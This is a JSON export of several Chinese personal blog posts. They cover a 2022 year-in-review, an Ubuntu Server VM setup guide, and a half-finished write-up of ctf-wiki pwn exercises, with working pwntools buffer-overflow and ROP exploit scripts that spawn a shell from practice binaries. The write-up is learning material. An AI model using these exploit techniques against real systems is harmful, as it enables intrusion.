[{"content":"不写前言了。鸽了一个月终于想起来写去年的年终总结了。\n22年最大的感受就是累，入职这家公司半年感觉身体都有点要垮的样子。痛风确诊到现在犯了大概有五六次了，检测治疗出去大几千，医生建议是减肥，但996的节奏真的没那个精力。另外牙疼、牙龈红肿也犯了几次，一直想找时间约牙医，同样是因为时间问题没找。当然牙齿的问题最后还是怪不到公司头上，毕竟没主动请假。约个时间看下医生至少心安一点。身体要垮的另一个征兆是开始频繁有心慌、心悸的感觉，特别是下午惯例一杯咖啡后更明显。23年不好好练一下身体，30前真可能猝死，有点怕了。\n22年最大的决策就是跳槽，从制造/教育跨行业跳到了信息安全。最初的考虑是安全方向有国家扶持的情况下增长比较稳定，能长期在这个行业内求职，有一定积累后甚至创业。试用期考虑过佛山的另一家公司，至少HR给我的感觉是更专业和正规的，背景也不差。但因为种种原因反正是没选，预计方向虚拟化、网络，当时考虑是合同签广州有点风险，薪资空间/WLB/技术方向要不要走虚拟化/网络有疑虑，而且家里反对，加上面试中隐隐有点被PUA的感觉不太舒服，再者是和部门领导谈了之后确实有被说服。综合各种原因吧，最后还是拒了offer。\n现在这家呢，体验就是卷，钱多事少离家近一个不占。一边压人力成本一边高要求高标准，典型既要又要。入职半年待的第一个项目组和前领导就裁光/走光了，说没有点唇亡齿寒是假的。那为什么不走？那也得先找到下家，尽管现在这家公司不行，但看得到信安这行还是有饭吃的，基础技术层面像 OS、网络上的发挥空间也比较大，潜心干一段时间攒下信安圈工作的资历，是能做到习得屠龙术，货与帝王家的。哦，当然公司不会教你屠龙术，还得自己业余时间学。在找到下家信安-攻防方向、待遇和工作压力合适的公司，或者基层开发之外职位前，应该还会先继续干下去。身体问题只能压一下业余娱乐生活的时间了，找不到女朋友就找不到吧。\n说到业余时间，前年买电钢琴烧了两千多软妹币，22年又买了电吉他，烧一千多软妹币，至今没学会啥。倒是弟弟去报了个钢琴班，砸下去接近一个w，能弹两首了。可惜他应该是没兴趣，在家基本不练。而我，买了两本书，电吉他还是没学起来，小星星都弹不流畅。\n学不起来想找理由可太多了，但没有投入大把时间练习和学习也是真的。所以这事儿也不能怪别的，就是惰性使然。但我是真的想学乐器来着，只不过烧w也真的奢侈……唉。\n钱的问题，22年没攒什么钱。但算算，之前公司给的薪酬待遇还是很够意思的，过节还能送 JD购物卡，21年年终奖也实打实十几k到手，优秀员工3k，比这家铁公鸡好多了。唯一不爽的就是没啥成果，但关于这点，还是我图样了。明明找到了正确的搞法，摸鱼学技术就好，结果非要跳这家坑壁公司。想想都是泪。\n再说别的，还在上家公司的时候决定自考本科，22年10月拿下了马原、C++、数据库系统，算开门红。23年4月争取管理信息系统、管理经济学、计算机原理、近代史，要背的东西比较多。马上就3月报名了，还没吃完管理信息系统。近代史要背的那么多还没背。考虑换一门把握大点的，不浪费一次考试机会，近代史可以换普通逻辑或数据结构导论。\n另外就是打算考几张证，因为学历确实不太好拿出手，有证给双方都多点信心。考虑有 RHCE、网络工程师、系统分析师，其中网工或者网络规划设计师个人比较感兴趣，35岁被裁了还可以去拉线打水晶头哈哈哈（无感情）。CKA也可以考下，太多沙比公司瞎上k8s了。目前顾虑的是含金量不太行，难度上来说软考居然还是比较高的。CKA和RHCE这种要续期的难度还低点，感觉像收智商税了。\n那么，娱乐环节！\n《Ender Lilies》 老游戏了，记得是前两年有看到B站上的评测，映像不多了，但音乐和角色到现在还记着。趁打折买了，我唯一一款手柄游玩的游戏，手残党打到狂骑士狼实在过不去了，但又不想云，不得不作弊。\n《赛博朋克：边缘行者》、《赛博朋克 2077》 如果没有年底的孤独摇滚的话，那就算是年度番了。对夜之城，“逐梦之城”给出了另一番诠释。别的我不多说，看我游戏时间。\n能点评的东西太多了。中配接地气但有些地方语气感觉不对，bug确实多，映像最深的还是黑梦的bug，全黑我一度以为是什么超大胆的表现形式创新，而且确实效果特别好，让我激动好一会儿。结果居然是个bug。别的就还好吧，不影响我把夜之城烧成灰。\n《脑叶公司》 这游戏很早买的，记得应该是这游戏才出没多久，当时还是我第一份工作来着，第一次和同事一起去温泉旅馆，可惜没留什么照片。晚上拿第一份工资买的 surface laptop 玩这游戏。之后嘛，直到22年才第一次完全通关。非常有 SCP 味的叙事，三渣的惊悚乐园里玩脑叶和SCP的捏他的时候还兴奋了两天来着（诶，是这本吗，记不清了）。我也是 SCP中分 wiki-dot 注册会员来着，当初想写点啥，但没写出来，惯例了。\n感觉自从第一本同人烂尾之后就再没写出啥东西。\n《孤独摇滚》 年度番，很触动。\n混迹的互联网粪坑多了会发现网上话痨多少都有点社恐，我愿称之为赛博社恐幸存者效应。毕竟现充谁天天上网冲浪对线啊。但凡网上评论区24小时在线的熟面孔（非利益驱动的）多少都有点小社恐，社交恐怖分子也算。\n但是呢，小孤独年纪轻轻坐拥3w粉丝，一手吉他出神入化，只是有点小社恐。而你除了社恐什么都没有。\n（有被冒犯到 2333）\n当然，最重要的还是，第8集，第12集的演出，看过一遍之后就会有种抓心挠肝的痒，恨不得自己拿上吉他来两下。\n最后！！！ 2023 必然是个烂年，又或者在之后的更烂的年份中较好的一年。历史的螺旋上升正在进入下行轨道。人口拐点其实早在15年就到了，16年全面二孩强行拉了两年出生率，但16年开始，往后的出生人口就一直是下降了。到了23年，16年出生人口7岁，也差不多全都上小学了，再往后入学只会一年比一年少。出生人口下降带来的对经济的冲击其实早就有出现，幼儿园招不满、招生难早几年就开始出现了，只是这种冲击还在传导中。\n2016年出生人口1786万，2017年1723万，2018年1523万，2019年1465万，2020年1200万，2021年1062万，22年未公布，但22年是首个出生人口小于死亡人口的年份。\n未来20年，随着这波人口潮汐的顶峰扫过各行各业，适龄人口从1700万在5年间锐减700万乃至越来越低的压力层层传递，已经可以预见好日子真的在后头，再过20年就业人口不足的压力就要传导到招聘方了。只可惜再过20年现在这批二十多岁的韭菜就变成40多的韭菜啦，给老爷们养完老，人口潮汐的压力差不多也要到养老领域了，社保公积金收不抵支也是可以预见的。实惨呗。\n一代人有一代人的惨，没啥可哭的，早八辈子就知道活着就是受罪了，地狱说的就是人间。\n现在就看伟大的party能有啥对策，要不然快进到三战也是能接受的，种完蘑菇大家也可以相信下一季智慧生物的智慧嘛。\n祝大家2023都能快快乐乐享受尚在高点的人生！\n","date":"2023-02-26T22:40:00+08:00","permalink":"https://nnnewb.github.io/blog/p/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/","title":"2022年度总结"},{"content":"元旦快乐！ 2023 也要努力活下去！\n","date":"2023-01-02T16:05:21+08:00","permalink":"https://nnnewb.github.io/blog/p/%E5%85%83%E6%97%A6%E5%BF%AB%E4%B9%90/","title":"元旦快乐"},{"content":"Ubuntu Server 是我目前比较习惯用的开发用 Linux 虚拟机系统，选择 Ubuntu Server 的原因也很简单：问答资源什么的比较丰富，安装过程足够快捷可控，以及日常开发使用中相对没那么折腾。\n但 Ubuntu Server 默认配置也有些比较恶心人的东西，比如那个 snapd ，平时基本用不到，但系统用了一段时间后经常看到 snapd 关机的时候等待 120s 或者启动报错之类。同样比较烦人的是 systemd-networkd-wait-online ，会拖慢开机时间，而且经常能看到失败。\n且不说这个检查机制到底是怎么实现的，虚拟机环境基本不配什么开机启动依赖网络的服务，等网络确实没什么意义。\n最后还有一个比较迷惑的问题，默认装完 Ubuntu Server 设置的 systemd target 是 graphical ，但安装选项是不含桌面的。所以为了不加载没啥用还可能导致问题的服务，默认 target 也得改成 multi-user 。\n具体流程：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  # 卸载和禁用 snapd sudo apt autoremove --purge snapd sudo apt-mark hold snapd # 修改 systemd-networkd-wait-online 的等待时间 # ExecStart=/lib/systemd/systemd-networkd-wait-online --timeout 1 # 加上 --timeout 1 sudo systemctl edit systemd-networkd-wait-online.service --full # 修改目标 multi-user sudo systemctl set-default multi-user # 重启生效 sudo reboot   这是一方面。\n另外还有个比较讨厌的问题是网络配置，公司内网不允许虚拟机桥接，而 NAT 模式宿主机是不能直接通过 IP 访问虚拟机的，所以还得加一张 Host-Only 网卡。此外，因为工作需要，还得准备两台用来给公司代码编译打包的虚拟机（也是历史遗留的大坑），以及一台测试用的虚拟机。这些虚拟机之间需要互通，然而 NAT 模式网卡也是不支持虚拟机之间互通的，所以还是要加 Host-Only 网卡。\n然后就是 Host-Only 网卡的问题了，默认是 DHCP 分配 IP ，会偶发的出现虚拟机 IP 改变，导致一些写好的脚本不得不改下才能跑。所以还得顺便改下静态 IP 。嗯，虚拟机有部分是 CentOS 的，配置静态 IP 方法和 Ubuntu Server 不一样，但这篇只聊下 Ubuntu Server 的配置静态 IP 方法。\n简而言之，参考 Canonical Netplan 这篇文档。在 /etc/netplan/ 下面新建一个 01-host-only.yaml 配置如下。\n1 2 3 4 5 6 7 8 9 10 11 12  network:version:2renderer:networkdethernets:ens37:dhcp4:noaddresses:[192.168.129.101/24]nameservers:addresses:[114.114.114.114,114.114.115.115]routes:- to:192.168.129.0/24via:192.168.129.1  需要注意的是得看下虚拟机的 Host-Only 网卡配置的是哪个网段，以及 Host-Only 的网卡名是什么（我的机器上是 ens37）。Host-Only 网卡配 nameservers 没啥意义我这写了也就写了。\n改好之后 sudo netplan aplpy 应用，再试试 ip addr show 看看生效了，ping -I ens37 192.168.129.xxx 试下能不能通其他 Host-Only 网卡的 IP 。最好再试下 curl -L https://www.baidu.com/ 看看正常上网有没有问题。\n","date":"2022-12-31T17:15:43+08:00","permalink":"https://nnnewb.github.io/blog/p/%E6%88%91%E7%9A%84-ubuntu-server-%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/","title":"我的 Ubuntu Server 虚拟机配置"},{"content":"ret2text  来源 ctf-wiki basic-rop 。\n ret2text 是最简单的一题了。gdb 确定目标地址后直接溢出即可。\n基本信息 1 2 3 4 5 6 7 8 9  # file bin/ret2text: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4f13f004f23ea39d28ca91f2bb83110b4b73713f, with debug_info, not stripped # checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial   行为分析 运行 ret2text 观察行为。\n1 2 3  There is something amazing here, do you know anything? no Maybe I will tell you next time !%   反编译分析 objdump -Sd ret2text 然后找到 main 函数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70  08048648 \u0026lt;main\u0026gt;: 8048648:\t55 push %ebp 8048649:\t89 e5 mov %esp,%ebp 804864b:\t83 e4 f0 and $0xfffffff0,%esp 804864e:\t83 c4 80 add $0xffffff80,%esp 8048651:\ta1 60 a0 04 08 mov 0x804a060,%eax 8048656:\tc7 44 24 0c 00 00 00 movl $0x0,0xc(%esp) 804865d:\t00 804865e:\tc7 44 24 08 02 00 00 movl $0x2,0x8(%esp) 8048665:\t00 8048666:\tc7 44 24 04 00 00 00 movl $0x0,0x4(%esp) 804866d:\t00 804866e:\t89 04 24 mov %eax,(%esp) 8048671:\te8 5a fe ff ff call 80484d0 \u0026lt;setvbuf@plt\u0026gt; 8048676:\ta1 40 a0 04 08 mov 0x804a040,%eax 804867b:\tc7 44 24 0c 00 00 00 movl $0x0,0xc(%esp) 8048682:\t00 8048683:\tc7 44 24 08 01 00 00 movl $0x1,0x8(%esp) 804868a:\t00 804868b:\tc7 44 24 04 00 00 00 movl $0x0,0x4(%esp) 8048692:\t00 8048693:\t89 04 24 mov %eax,(%esp) 8048696:\te8 35 fe ff ff call 80484d0 \u0026lt;setvbuf@plt\u0026gt; 804869b:\tc7 04 24 6c 87 04 08 movl $0x804876c,(%esp) 80486a2:\te8 d9 fd ff ff call 8048480 \u0026lt;puts@plt\u0026gt; 80486a7:\t8d 44 24 1c lea 0x1c(%esp),%eax 80486ab:\t89 04 24 mov %eax,(%esp) 80486ae:\te8 ad fd ff ff call 8048460 \u0026lt;gets@plt\u0026gt; 80486b3:\tc7 04 24 a4 87 04 08 movl $0x80487a4,(%esp) 80486ba:\te8 91 fd ff ff call 8048450 \u0026lt;printf@plt\u0026gt; 80486bf:\tb8 00 00 00 00 mov $0x0,%eax 80486c4:\tc9 leave 80486c5:\tc3 ret 80486c6:\t66 90 xchg %ax,%ax 80486c8:\t66 90 xchg %ax,%ax 80486ca:\t66 90 xchg %ax,%ax 80486cc:\t66 90 xchg %ax,%ax 80486ce:\t66 90 xchg %ax,%ax08048648 \u0026lt;main\u0026gt;: 8048648:\t55 push %ebp 8048649:\t89 e5 mov %esp,%ebp 804864b:\t83 e4 f0 and $0xfffffff0,%esp 804864e:\t83 c4 80 add $0xffffff80,%esp 8048651:\ta1 60 a0 04 08 mov 0x804a060,%eax 8048656:\tc7 44 24 0c 00 00 00 movl $0x0,0xc(%esp) 804865d:\t00 804865e:\tc7 44 24 08 02 00 00 movl $0x2,0x8(%esp) 8048665:\t00 8048666:\tc7 44 24 04 00 00 00 movl $0x0,0x4(%esp) 804866d:\t00 804866e:\t89 04 24 mov %eax,(%esp) 8048671:\te8 5a fe ff ff call 80484d0 \u0026lt;setvbuf@plt\u0026gt; 8048676:\ta1 40 a0 04 08 mov 0x804a040,%eax 804867b:\tc7 44 24 0c 00 00 00 movl $0x0,0xc(%esp) 8048682:\t00 8048683:\tc7 44 24 08 01 00 00 movl $0x1,0x8(%esp) 804868a:\t00 804868b:\tc7 44 24 04 00 00 00 movl $0x0,0x4(%esp) 8048692:\t00 8048693:\t89 04 24 mov %eax,(%esp) 8048696:\te8 35 fe ff ff call 80484d0 \u0026lt;setvbuf@plt\u0026gt; 804869b:\tc7 04 24 6c 87 04 08 movl $0x804876c,(%esp) 80486a2:\te8 d9 fd ff ff call 8048480 \u0026lt;puts@plt\u0026gt; 80486a7:\t8d 44 24 1c lea 0x1c(%esp),%eax 80486ab:\t89 04 24 mov %eax,(%esp) 80486ae:\te8 ad fd ff ff call 8048460 \u0026lt;gets@plt\u0026gt; 80486b3:\tc7 04 24 a4 87 04 08 movl $0x80487a4,(%esp) 80486ba:\te8 91 fd ff ff call 8048450 \u0026lt;printf@plt\u0026gt; 80486bf:\tb8 00 00 00 00 mov $0x0,%eax 80486c4:\tc9 leave 80486c5:\tc3 ret   注意到不安全函数 gets 调用，计算 lea 后参数应该是 0x1c(%esp)，也就是栈顶往下28个字节。观察函数序言部分，add $0xffffff80,%esp 分配了 128 个字节大小的栈空间，128-28=100 。初步猜测 gets 参数长度 100 字节。输入大于 100 即造成溢出。\n然后我们寻找到想要返回的目标地址：\n1 2  080485fd \u0026lt;secure\u0026gt;: ... 略   gdb 调试计算 0x1c(%esp) 到返回地址的距离。\n返回地址在 0xffffd24c，0x1c(%esp) 是 0xffffd1dc，相减得 112 。\n尝试写出 exploit。\n1 2 3 4 5 6 7 8 9 10 11 12  import pwn import struct p = pwn.gdb.debug(\u0026#39;bin/ret2text\u0026#39;, \u0026#39;\u0026#39;\u0026#39; b main continue \u0026#39;\u0026#39;\u0026#39;) print(p.recv().decode()) p.send(b\u0026#39;A\u0026#39; * 112 + struct.pack(\u0026#39;\u0026lt;I\u0026#39;, 0x080485fd)) print(p.recv().decode()) p.interactive()   调试发现段错误，继续阅读 secure 函数的代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  080485fd \u0026lt;secure\u0026gt;: 80485fd:\t55 push %ebp 80485fe:\t89 e5 mov %esp,%ebp 8048600:\t83 ec 28 sub $0x28,%esp 8048603:\tc7 04 24 00 00 00 00 movl $0x0,(%esp) 804860a:\te8 61 fe ff ff call 8048470 \u0026lt;time@plt\u0026gt; 804860f:\t89 04 24 mov %eax,(%esp) 8048612:\te8 99 fe ff ff call 80484b0 \u0026lt;srand@plt\u0026gt; 8048617:\te8 c4 fe ff ff call 80484e0 \u0026lt;rand@plt\u0026gt; 804861c:\t89 45 f4 mov %eax,-0xc(%ebp) 804861f:\t8d 45 f0 lea -0x10(%ebp),%eax 8048622:\t89 44 24 04 mov %eax,0x4(%esp) 8048626:\tc7 04 24 60 87 04 08 movl $0x8048760,(%esp) 804862d:\te8 be fe ff ff call 80484f0 \u0026lt;__isoc99_scanf@plt\u0026gt; 8048632:\t8b 45 f0 mov -0x10(%ebp),%eax 8048635:\t3b 45 f4 cmp -0xc(%ebp),%eax 8048638:\t75 0c jne 8048646 \u0026lt;secure+0x49\u0026gt; 804863a:\tc7 04 24 63 87 04 08 movl $0x8048763,(%esp) 8048641:\te8 4a fe ff ff call 8048490 \u0026lt;system@plt\u0026gt; 8048646:\tc9 leave 8048647:\tc3 ret   人肉反编译下得到伪代码。\n1 2 3 4 5  srand(time()); var_0xc = rand(); scanf(\u0026#34;%d\u0026#34;, \u0026amp;var_0x10); if (var_0xc != var_0x10) return; system(\u0026#34;/bin/sh\u0026#34;);   soooooo，没必要硬怼随机数，直接跳到 system(\u0026quot;/bin/sh\u0026quot;) 就好。把 exploit 中跳转地址改成 0x804863a 完事。\nexploit 1 2 3 4 5 6 7 8 9  import pwn import struct p = pwn.process(\u0026#39;./bin/ret2text\u0026#39;) print(p.recv().decode()) p.sendline(b\u0026#39;A\u0026#39;*112+struct.pack(\u0026#39;\u0026lt;I\u0026#39;, 0x804863a)) print(p.recv().decode()) p.interactive()   ret2shellcode  来源依然是 ctf-wiki 我就不放链接了。\n 基本信息 1 2 3 4 5 6 7 8  # file bin/ret2shellcode: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=47e6d638fe0f3a3ff4695edb8b6c7e83461df949, with debug_info, not stripped # checksec CANARY : disabled FORTIFY : disabled NX : disabled PIE : disabled RELRO : Partial   行为分析 1 2 3 4  (.venv) vm :: repos/pwn/lab-4 » bin/ret2shellcode No system for you this time !!! noooooooooooo bye bye ~%   反编译分析 这次换个工具。\n知名的 Ghidra，直接看 C 代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13  int main(void) { char buf [100]; char local_74 [112]; setvbuf(stdout,(char *)0x0,2,0); setvbuf(stdin,(char *)0x0,1,0); puts(\u0026#34;No system for you this time !!!\u0026#34;); gets(local_74); strncpy(buf2,local_74,100); printf(\u0026#34;bye bye ~\u0026#34;); return 0; }   不装模作样分析，直接看strncpy，函数签名是 strncpy(char* dest,const char* src, size_t count)，写入的位置 buf2 观察下有没有执行权限。buf2 是可读写全局变量，这种全局变量放置在.bss段，所以直接看.bss段有没有可执行属性。\nemmm\u0026hellip;\u0026hellip;\nemmmmmmmmmm\u0026hellip;\u0026hellip;\u0026hellip;.\n好。那不用看 ctf-wiki 的题解了，按自己的思路来。checksec 的结果是 NX: false，栈上有可执行权限。而且没有 PIE，关了 ASLR 直接硬编码栈上地址就完事。\n老规矩算一下 buf 0xffffd0ec 到返回地址的 0xffffd15c 距离，溢出后地址设置为buf的地址。计算得距离 112 字节，接下来写 exploit 。\nexploit  注意环境变量数量会影响 \u0026amp;buf 的地址，为了保证得到的地址和 pwn.process 启动一致，最好调试时也使用 pwn.gdb.debug 启动，设置下 env={}。或自己管理环境变量，确保不影响栈上变量的地址。\n 1 2 3 4 5 6 7 8 9 10  import pwn from pwn import shellcraft import struct p = pwn.process(\u0026#39;./bin/ret2shellcode\u0026#39;, env={}) payload = pwn.asm(shellcraft.linux.sh()) payload += b\u0026#39;A\u0026#39; * (112 - len(payload)) payload += struct.pack(\u0026#39;\u0026lt;I\u0026#39;, 0xffffddcc) p.sendline(payload) p.interactive()   ret2syscall  题目来自 ctf-wiki。\n 基本信息 1 2 3 4 5 6 7 8  # file bin/ret2syscall: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped # checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial   行为分析 1 2 3 4  (.venv) vm :: repos/pwn/lab-4 » bin/ret2syscall This time, no system() and NO SHELLCODE!!! What do you plan to do? 123   反编译分析 还是 Ghidra ，熟悉下工具。\n只有一个输入，buf实际长度应该是100，和返回地址距离112。因为NX开启栈段是没有执行权限的。简单翻一下 PLT 发现也确实没有 system 函数。\nx86 32位系统调用 int 80h 方式需要通过寄存器传参和传递系统调用号，单覆盖一个返回地址是屁用没有的。想要构造出系统调用必须的上下文（覆盖给定的寄存器），就需要找到一个或多个 pop; ret 指令序列，填充好寄存器后再跳转到 int $0x80指令处。\n需要控制的寄存器有：eax、ebx、ecx、edx 四个。\n用 ROPGadget 查找可用的 Gadgets 。\n1 2 3 4 5 6  (.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2syscall --only \u0026#39;pop|ret\u0026#39; | grep \u0026#39;eax\u0026#39; 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x080bb196 : pop eax ; ret 0x0807217a : pop eax ; ret 0x80e 0x0804f704 : pop eax ; ret 3 0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret   第一个和第六个都能控制多个寄存器，但都有多余的 pop 指令，我们先选第二个 0x080bb196 : pop eax ; ret 再搜索控制ebx的指令序列。简单起见我就把其他结果略了，下面的结果正好控制了剩余三个寄存器 ebx、ecx、edx。\n1  0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret   再寻找一个 int $0x80 。\n1 2 3 4  (.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2syscall --only \u0026#39;int\u0026#39; Gadgets information ============================================================ 0x08049421 : int 0x80   然后顺便找一下有没有现成的 /bin/sh 或者 sh 字符串可以用。\n1 2 3 4  (.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2syscall --string \u0026#39;/bin/sh\u0026#39; Strings information ============================================================ 0x080be408 : /bin/sh   我们最终想要得到的栈是这样的：\n现在已经凑齐了所有要素，可以开始写 exploit 。\nexploit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  import pwn import struct p = pwn.process(\u0026#39;./bin/ret2syscall\u0026#39;) # gadgets chain gadget1 = pwn.p32(0x080bb196) # pop eax; ret eax = pwn.p32(11) gadget2 = pwn.p32(0x0806eb90) # pop edx; pop ecx; pop ebx; ret edx = pwn.p32(0) ecx = pwn.p32(0) ebx = pwn.p32(0x080be408) gadget3 = pwn.p32(0x08049421) # int 0x80 payload = b\u0026#39;\u0026#39;.join([b\u0026#39;A\u0026#39;*112, gadget1, eax, gadget2, edx, ecx, ebx, gadget3]) p.sendline(payload) p.interactive()   ret2libc1 基本信息 1 2 3 4 5 6 7 8  # file bin/ret2libc1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped # checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial   行为分析 1 2 3  (.venv) vm :: repos/pwn/lab-4 » bin/ret2libc1 RET2LIBC \u0026gt;_\u0026lt; hi   反编译分析 老样子。112偏移，看一眼有没有可利用的字符串。\n1 2 3 4  (.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2libc1 --string \u0026#39;/bin/sh\u0026#39; Strings information ============================================================ 0x08048720 : /bin/sh   再看一眼 PLT 有没有 system 函数。\n1 2  (.venv) vm :: repos/pwn/lab-4 » objdump -d -j .plt bin/ret2libc1 | grep system 08048460 \u0026lt;system@plt\u0026gt;:   接下来就简单了，直接写 exploit 。\nexploit 1 2 3 4 5 6  from pwn import * p = process(\u0026#39;./bin/ret2libc1\u0026#39;, env={}) # \u0026amp;system reta \u0026#34;/bin/sh\u0026#34; p.sendline(flat([b\u0026#39;A\u0026#39;*112, 0x08048460, 0, 0x08048720])) p.interactive()   ret2libc2 基本信息 1 2 3 4 5 6 7 8  # file bin/ret2libc2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped # checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial   行为分析 1 2 3  (.venv) vm :: repos/pwn/lab-4 » bin/ret2libc2 Something surprise here, but I don\u0026#39;t think it will work. What do you think ?no   反编译分析 main 函数里没有有用的内容。搜索 /bin/sh 字符串无结果，但有 system 函数。那我们考虑下怎么往里面填一个 /bin/sh 。大致扫上一眼没有别的值得关注的地方，就开始考虑下怎么填字符串。\n填字符串最直接的办法就是往栈上压，然后栈上地址传给 system 。缺点是这个做法在开启 PIE 的时候就没成功过，大概是栈上变量的地址一直在变。\n另一个办法是找个 RW 权限的内存段往里面写，然后把地址传给 system。注意到导出符号有一个全局变量 buf2。\nbuf2 是一个可写的全局变量，在.bss段里，我们直接用它，配合 gets 来控制程序读 /bin/sh 字符串。\n预期的栈结构如下。\ngets 读取完/bin/sh后直接跳转system，原先作为gets参数的buf2地址就变成了system的返回地址，不过我们不在乎。第二个buf2则变成了system的参数。\n从 plt 取 gets 和 system 函数的地址，然后开始写 exploit 。\n1 2 3 4  (.venv) vm :: repos/pwn/lab-4 » objdump -d -j .plt bin/ret2libc2 | grep system 08048490 \u0026lt;system@plt\u0026gt;: (.venv) vm :: repos/pwn/lab-4 » objdump -d -j .plt bin/ret2libc2 | grep gets 08048460 \u0026lt;gets@plt\u0026gt;:   exploit 1 2 3 4 5 6  from pwn import * p = process(\u0026#39;./bin/ret2libc2\u0026#39;, env={}) p.sendline(flat([b\u0026#39;A\u0026#39;*112, 0x08048460, 0x08048490, 0x0804a080, 0x0804a080])) p.sendline(b\u0026#39;/bin/sh\u0026#39;) p.interactive()   ret2libc3 基本信息 1 2 3 4 5 6 7 8  # file bin/ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, with debug_info, not stripped # checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial   行为分析 1 2 3  (.venv) vm :: repos/pwn/lab-4 » bin/ret2libc3 No surprise anymore, system disappeard QQ. Can you find it !?no   反编译分析 查看 plt 发现确实没有 system 函数。\n1 2  (.venv) vm :: repos/pwn/lab-4 » objdump -d -j .plt bin/ret2libc3 | grep system (.venv) vm :: repos/pwn/lab-4 »   能不能用 ret2syscall 的技巧呢？\n1 2 3 4 5 6 7 8 9 10 11 12  (.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2libc3 --only \u0026#39;pop|ret\u0026#39; 1 ↵ Gadgets information ============================================================ 0x080486ff : pop ebp ; ret 0x080486fc : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x0804841d : pop ebx ; ret 0x080486fe : pop edi ; pop ebp ; ret 0x080486fd : pop esi ; pop edi ; pop ebp ; ret 0x08048406 : ret 0x0804854e : ret 0xeac1 Unique gadgets found: 7   很遗憾，缺乏控制 ecx 和 edx 寄存器的 gadget 。直接快进到找 system 地址。学习一下 ctf-wiki 上关于找 libc 里地址的方法。装个 libcsearcher，整理下思路。\n取得system函数的原理是利用 libc.so 库函数之间相对偏移确定这一点，只要已知 libc 版本和一个 libc 函数的地址，即可推算出其他 libc 函数的地址。利用这一原理取得 libc 地址需要先知道当前 libc 版本和一个已知地址。\n取得已知地址则又需要一点点技巧，因为 GOT 是延迟绑定的。也就是说，只有在第一次调用后，GOT 里填充的值才是真正的地址。在第一次调用前，里面填充其实是 PLT 的地址。我们用代码说话。\n1 2 3 4  08048490 \u0026lt;__libc_start_main@plt\u0026gt;: 8048490: ff 25 24 a0 04 08 jmp *0x804a024 8048496: 68 30 00 00 00 push $0x30 804849b: e9 80 ff ff ff jmp 8048420 \u0026lt;.plt\u0026gt;   jmp *0x804a024，0x804a024是 GOT 上 __libc_start_main 的地址，在第一次调用前，这个地址上填充的值实际是 0x8048496，也就是 __libc_start_main@plt 第二条指令 push $0x30 的地址。\n而后的 push和 jmp 最终会调用 _dl_runtime_resolve 函数（.got.plt第三项）完成解析，填充 GOT 并返回。\n这玩意儿和 PE 文件的 IAT 性质是一样的，只是PE少一步延迟链接。\n综上所述随便拿一个GOT表项的值是不行的，因为里面的地址可能是 PLT 的地址而不是真实 libc 函数的地址。\n烂尾总结 续于 2022年12月31日。\n整理草稿箱的时候发现了这篇写了一半的博客。这篇应该是在六七月开始写的，写了大半，结果工作一忙，完全忘了。这会儿思路也续不上，干脆就弃坑了。\n就这样吧，叹口气，但不管怎么着生活还得继续。\n","date":"2022-12-31T14:07:29+08:00","permalink":"https://nnnewb.github.io/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/","title":"几个简单的 pwn 练习"},{"content":"简述下感受。\n几乎就是放开之后几天，先是弟弟在佛山有感冒症状给送回家，然后是父母阳了，接着就是我。\n从 12/9 得知家人阳性开始居家，12/12开始发热，最高烧到40°，然后进入恢复期等转阴。\n上次抗原在 12/21 